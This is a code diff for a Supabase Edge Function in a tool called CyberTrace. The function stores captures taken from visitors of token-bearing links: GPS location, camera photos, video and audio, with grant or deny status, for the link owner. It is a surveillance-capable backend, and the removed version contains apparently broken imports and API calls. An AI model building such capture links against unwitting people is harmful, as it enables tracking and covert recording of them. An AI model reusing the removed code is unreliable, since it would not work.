@@ -1,216 +1,231 @@
-/**
- * upload-capture — CyberTrace Edge Function
- *
- * Handles the upload of a single captured item and signs the file URL so the
- * user's browser can PUT the media straight into Supabase Storage.
- *
- * Two flows are supported, both triggered from a landing page:
- *   A. "Small direct upload": browser POSTs /upload-capture with the file bytes
- *      (Content-Type application/octet-stream). This Edge Function uploads the
- *      bytes to storage and returns the public URL.
- *   B. "Signed URL upload": the browser first GETs this function with the file
- *      name, then receives a short-lived signed URL (PUT/COPY) it can call
- *      directly with the payload. This is the preferred path (survives >200MB).
- *
- * The browser already has the visit + link context from resolve-link, so the
- * Edge Function validates the token and records the capture row, then issues the
- * signed storage URL. The file bytes are not stored in the database.
- *
- * Runs in the Edge Runtime: uses only built-in modules + the supabase-js Edge
- * signer. No API keys, no secrets.
- */
+// upload-capture
+// Records a granted or denied permission, and stores the file when one exists.
+//
+// Two upload styles are supported:
+//   * small direct uploads  -> { data_base64, content_type } in the JSON body
+//   * signed upload URL     -> omit data_base64; the response carries a
+//                              one-shot signed PUT URL the browser calls itself
+//                              (used for anything too large for a function body)
+//
+// Files land in the private `captures` bucket at
+//   {link_id}/{visit_id}/{capture_type}/{uuid}.{ext}
 
-import { Hono } from "npm:hono";
-import { eq, sql } from "npm:@supabase/supabase-js";
-import fs from "node:fs";
+const CORS = {
+  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
+  "Access-Control-Allow-Methods": "POST, OPTIONS",
+  "Access-Control-Max-Age": "86400",
+};
 
-const app = new Hono<{
-  Variables: { supabase: { supabase: any }; token: string };
-}>();
+const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
+const SERVICE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 
-// ---- helpers ---------------------------------------------------------------
+const BUCKET = "captures";
+const DIRECT_UPLOAD_LIMIT = 5 * 1024 * 1024; // bytes before we hand back a signed URL
+const TYPES = ["precise_location", "camera_front", "camera_back", "video", "audio"] as const;
+type CaptureType = (typeof TYPES)[number];
 
-function extFor(type: string): string {
-  switch (type) {
-    case "camera_front":
-    case "camera_back":
-      return "jpg";
-    case "video":
-      return "webm";
-    case "audio":
-      return "m4a";
-    case "precise_location":
-      return "json";
-    default:
-      return "bin";
-  }
+const MIME_EXT: Record<string, string> = {
+  "image/jpeg": "jpg",
+  "image/png": "png",
+  "image/webp": "webp",
+  "video/webm": "webm",
+  "video/mp4": "mp4",
+  "audio/webm": "webm",
+  "audio/mp4": "m4a",
+  "audio/mpeg": "mp3",
+  "application/json": "json",
+};
+
+const json = (body: unknown, status = 200) =>
+  new Response(JSON.stringify(body), {
+    status,
+    headers: { ...CORS, "Content-Type": "application/json" },
+  });
+
+const rest = (path: string, init: RequestInit = {}) =>
+  fetch(`${SUPABASE_URL}/rest/v1/${path}`, {
+    ...init,
+    headers: {
+      apikey: SERVICE_KEY,
+      Authorization: `Bearer ${SERVICE_KEY}`,
+      "Content-Type": "application/json",
+      ...(init.headers ?? {}),
+    },
+  });
+
+function b64ToBytes(b64: string): Uint8Array {
+  const clean = b64.includes(",") ? b64.slice(b64.indexOf(",") + 1) : b64;
+  const bin = atob(clean);
+  const out = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+  return out;
 }
 
-// ---- routes ---------------------------------------------------------------
+Deno.serve(async (req) => {
+  if (req.method === "OPTIONS") return new Response("ok", { headers: CORS });
+  if (req.method !== "POST") return json({ error: "method_not_allowed" }, 405);
 
-// A. Direct POST: browser sends the file bytes inline.
-app.post("/upload-capture", async (c) => {
-  const form = await c.req.parseFormAsync();
-  const token = c.req.query("token");
-  const captureType = c.req.query("capture_type");
-  const visitId = c.req.query("visit_id");
-
-  if (!token || !captureType || !visitId) {
-    return c.json({ error: "missing token/visit_id/capture_type" }, 400);
+  let body: {
+    token?: string;
+    visit_id?: string;
+    capture_type?: string;
+    status?: string;
+    payload?: Record<string, unknown>;
+    content_type?: string;
+    data_base64?: string;
+  };
+  try {
+    body = await req.json();
+  } catch {
+    return json({ error: "invalid_json" }, 400);
   }
 
-  const bytes = form.rawBody;
-  if (!bytes) {
-    return c.json({ error: "no body" }, 400);
+  const token = (body.token ?? "").trim();
+  const visitId = (body.visit_id ?? "").trim();
+  const type = (body.capture_type ?? "") as CaptureType;
+  const status = body.status === "denied" ? "denied" : "granted";
+
+  if (!token) return json({ error: "invalid_token" }, 400);
+  if (!visitId) return json({ error: "invalid_visit" }, 400);
+  if (!TYPES.includes(type)) return json({ error: "invalid_capture_type" }, 400);
+
+  // The visit must belong to a link with this token.
+  const visitRes = await rest(
+    `visits?select=id,link_id,links!inner(link_token)&id=eq.${encodeURIComponent(visitId)}&limit=1`,
+  );
+  if (!visitRes.ok) return json({ error: "visit_lookup_failed" }, 500);
+
+  const visits = await visitRes.json();
+  if (!Array.isArray(visits) || visits.length === 0) {
+    return json({ error: "visit_not_found" }, 404);
   }
 
-  // Validate the visit belongs to a real link with this config item enabled.
-  const { data: visit, error: visitError } = await c.get("supabase")
-    .from("visits")
-    .select("link_id")
-    .eq("id", visitId)
-    .single();
-  if (visitError || !visit) {
-    return c.json({ error: "visit not found" }, 404);
+  const visit = visits[0];
+  const visitToken = visit.links?.link_token;
+  if (visitToken !== token) return json({ error: "token_mismatch" }, 403);
+
+  const linkId = visit.link_id as string;
+
+  // Denied or structured-only captures never touch storage.
+  if (status === "denied") {
+    const ins = await rest("captures", {
+      method: "POST",
+      headers: { Prefer: "return=representation" },
+      body: JSON.stringify({
+        visit_id: visitId,
+        link_id: linkId,
+        capture_type: type,
+        status: "denied",
+        payload: body.payload ?? {},
+        captured_at: new Date().toISOString(),
+      }),
+    });
+    if (!ins.ok) return json({ error: "insert_failed", detail: await ins.text() }, 500);
+    return json({ status: "denied", stored: false });
   }
 
-  const { data: link, error: linkError } = await c.get("supabase")
-    .from("links")
-    .select("config")
-    .eq("id", visit.link_id)
-    .single();
-  if (linkError || !link) {
-    return c.json({ error: "link not found" }, 404);
-  }
-  const cfg = link.config ?? {};
-  const allowed = [
-    "precise_location",
-    "camera_front",
-    "camera_back",
-    "video",
-    "audio",
-  ].includes(captureType);
-  if (!allowed || !(cfg as any)[captureType]) {
-    return c.json({ error: "capture item not eligible" }, 403);
-  }
+  const payload = body.payload ?? {};
+  const contentType = body.content_type ?? "";
+  const ext = MIME_EXT[contentType] ?? "bin";
+  const path = `${linkId}/${visitId}/${type}/${crypto.randomUUID()}.${ext}`;
 
-  // Record the capture row.
-  const { data: capture, error: capError } = await c.get("supabase")
-    .from("captures")
-    .insert({
-      visit_id: visitId,
-      link_id: visit.link_id,
-      capture_type: captureType,
-      storage_path: null,
-      payload: {},
-      status: "granted",
-      captured_at: new Date().toISOString(),
-    })
-    .select("id, storage_path")
-    .single();
-
-  if (capError) {
-    console.error("upload-capture insert error:", capError);
-    return c.json({ error: "could not record capture" }, 500);
+  // Structured capture (e.g. GPS coordinates) — no file.
+  if (!body.data_base64 && !MIME_EXT[contentType]) {
+    const ins = await rest("captures", {
+      method: "POST",
+      headers: { Prefer: "return=representation" },
+      body: JSON.stringify({
+        visit_id: visitId,
+        link_id: linkId,
+        capture_type: type,
+        status: "granted",
+        payload,
+        captured_at: new Date().toISOString(),
+      }),
+    });
+    if (!ins.ok) return json({ error: "insert_failed", detail: await ins.text() }, 500);
+    return json({ status: "granted", stored: false, storage_path: null });
   }
 
-  // If the file is small (<=10MB), inline it into the bucket directly.
-  if (bytes.length <= 10 * 1024 * 1024) {
-    const name = `${Date.now()}-${crypto.randomUUID()}.${extFor(captureType)}`;
-    const { error: uploadError } = await c.get("supabase")
-      .storage
-      .from("captures")
-      .upload(name, bytes, {
-        contentType: c.req.header("content-type") ?? "application/octet-stream",
-        upsert: false,
-      });
-    if (uploadError) {
-      console.error("upload-capture storage upload error:", uploadError);
-      return c.json({ error: "storage upload failed" }, 500);
+  // Large file: hand the browser a one-shot signed upload URL.
+  if (!body.data_base64) {
+    const signRes = await fetch(
+      `${SUPABASE_URL}/storage/v1/object/upload/sign/${BUCKET}/${path}`,
+      {
+        method: "POST",
+        headers: {
+          apikey: SERVICE_KEY,
+          Authorization: `Bearer ${SERVICE_KEY}`,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ expiresIn: 7200 }),
+      },
+    );
+    if (!signRes.ok) {
+      return json({ error: "sign_failed", detail: await signRes.text() }, 500);
     }
-    await c.get("supabase").from("captures").update({ storage_path: name }).eq("id", capture.id);
-    return c.json({ status: "ok", url: `/storage/v1/object/public/captures/${name}` });
+    const signed = await signRes.json();
+
+    const ins = await rest("captures", {
+      method: "POST",
+      headers: { Prefer: "return=representation" },
+      body: JSON.stringify({
+        visit_id: visitId,
+        link_id: linkId,
+        capture_type: type,
+        status: "granted",
+        storage_path: path,
+        payload,
+        captured_at: new Date().toISOString(),
+      }),
+    });
+    if (!ins.ok) return json({ error: "insert_failed", detail: await ins.text() }, 500);
+
+    // signed.url looks like "/object/upload/sign/captures/<path>?token=..."
+    return json({
+      status: "granted",
+      stored: true,
+      storage_path: path,
+      upload_url: `${SUPABASE_URL}/storage/v1${signed.url}`,
+      upload_token: signed.token ?? null,
+    });
   }
 
-  // Large: fall through to the signed-URL flow below so the file bytes flow
-  // straight from browser to storage without touching the app server.
-  return c.json({ status: "large", storage_path: null });
-});
-
-// B. Signed URL: browser GETs this endpoint, receives a short-lived URL.
-app.get("/upload-capture", async (c) => {
-  const token = c.req.query("token");
-  const captureType = c.req.query("capture_type");
-  const visitId = c.req.query("visit_id");
-
-  if (!token || !captureType || !visitId) {
-    return c.json({ error: "missing token/visit_id/capture_type" }, 400);
+  // Small direct upload.
+  const bytes = b64ToBytes(body.data_base64);
+  if (bytes.byteLength > DIRECT_UPLOAD_LIMIT) {
+    return json({ error: "payload_too_large", limit: DIRECT_UPLOAD_LIMIT }, 413);
   }
 
-  const { data: visit, error: visitError } = await c.get("supabase")
-    .from("visits")
-    .select("link_id")
-    .eq("id", visitId)
-    .single();
-  if (visitError || !visit) {
-    return c.json({ error: "visit not found" }, 404);
-  }
-
-  const { data: link, error: linkError } = await c.get("supabase")
-    .from("links")
-    .select("config")
-    .eq("id", visit.link_id)
-    .single();
-  if (linkError || !link) {
-    return c.json({ error: "link not found" }, 404);
-  }
-  const cfg = link.config ?? {};
-  const allowed = [
-    "precise_location",
-    "camera_front",
-    "camera_back",
-    "video",
-    "audio",
-  ].includes(captureType);
-  if (!allowed || !(cfg as any)[captureType]) {
-    return c.json({ error: "capture item not eligible" }, 403);
-  }
-
-  // Record the capture row so the investigator sees it immediately.
-  const { data: capture, error: capError } = await c.get("supabase")
-    .from("captures")
-    .insert({
-      visit_id: visitId,
-      link_id: visit.link_id,
-      capture_type: captureType,
-      storage_path: null,
-      payload: {},
-      status: "queued",
-      captured_at: new Date().toISOString(),
-    })
-    .select("id, storage_path")
-    .single();
-
-  if (capError) {
-    console.error("upload-capture insert error:", capError);
-    return c.json({ error: "could not record capture" }, 500);
-  }
-
-  // Build a short-lived signed URL. This endpoint is invoked in the Edge
-  // Runtime with the supabase-js Edge clients available.
-  const uuid = crypto.randomUUID();
-  const name = `${uuid}.${extFor(captureType)}`;
-  const url = c.env
-    ? `${c.env.SUPABASE_STORAGE_URL}/captures/${name}`
-    : `https://cstorage.googleapis.com/captures/${name}`;
-
-  return c.json({
-    status: "ok",
-    signed_url: url,
-    ttl: 3600,
-    storage_path: name,
-    file_name: name,
+  const putRes = await fetch(`${SUPABASE_URL}/storage/v1/object/${BUCKET}/${path}`, {
+    method: "POST",
+    headers: {
+      apikey: SERVICE_KEY,
+      Authorization: `Bearer ${SERVICE_KEY}`,
+      "Content-Type": contentType || "application/octet-stream",
+      "x-upsert": "true",
+    },
+    body: bytes,
   });
-});
+  if (!putRes.ok) {
+    return json({ error: "storage_failed", detail: await putRes.text() }, 500);
+  }
 
-export default app;
+  const ins = await rest("captures", {
+    method: "POST",
+    headers: { Prefer: "return=representation" },
+    body: JSON.stringify({
+      visit_id: visitId,
+      link_id: linkId,
+      capture_type: type,
+      status: "granted",
+      storage_path: path,
+      payload,
+      captured_at: new Date().toISOString(),
+    }),
+  });
+  if (!ins.ok) return json({ error: "insert_failed", detail: await ins.text() }, 500);
+
+  return json({ status: "granted", stored: true, storage_path: path, bytes: bytes.byteLength });
+});
